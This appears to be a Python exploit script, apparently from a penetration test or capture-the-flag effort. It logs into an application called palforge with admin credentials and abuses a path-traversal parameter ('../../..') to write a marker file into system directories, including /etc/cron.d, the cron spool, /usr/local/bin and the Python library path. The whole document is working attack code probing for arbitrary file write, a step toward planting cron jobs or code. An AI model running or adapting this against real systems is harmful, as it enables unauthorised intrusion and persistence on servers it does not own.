import sys
sys.path.insert(0, ".")
import palforge as pf

tok = pf.login(*pf.ADMIN)
print("logged in")

targets = {
    "/usr/lib/python3.11": "usr/lib/python3.11",
    "/etc/cron.d": "etc/cron.d",
    "/usr/local/bin": "usr/local/bin",
    "/etc": "etc",
    "/tmp": "tmp",
    "/var/spool/cron/crontabs": "var/spool/cron/crontabs",
}
for absdir, code in targets.items():
    try:
        r = pf.write_to_path(tok, absdir, "zzmark.txt", b"marker", "../../..", code)
        print(f"{absdir} -> {r.status_code} {r.text[:80]!r}")
    except Exception as e:
        print(f"{absdir} -> ERR {e!r}")
